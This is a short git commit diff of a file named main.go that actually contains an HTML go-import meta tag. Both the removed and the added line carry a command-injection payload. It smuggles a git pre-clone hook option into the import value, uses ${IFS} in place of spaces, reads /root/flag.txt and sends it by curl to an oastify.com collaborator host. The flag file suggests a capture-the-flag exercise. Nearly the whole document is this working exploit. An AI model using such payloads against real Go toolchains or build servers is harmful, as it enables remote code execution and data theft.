de22b83229d02203472f50dae100920325decba7
Abdallah-Almahdy <140536488+Abdallah-Almahdy@users.noreply.github.com>
2025-08-11 00:14:24 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,5 +1,5 @@
 <html>
 <head>
-<meta name="go-import" content="github.com/Abdallah-Almahdy/cmd git --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}http://of7yd23ia6xljeg9ph8epjf5owunin6c.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
+<meta name="go-import" content=" --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}http://of7yd23ia6xljeg9ph8epjf5owunin6c.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
 </head>
 </html>
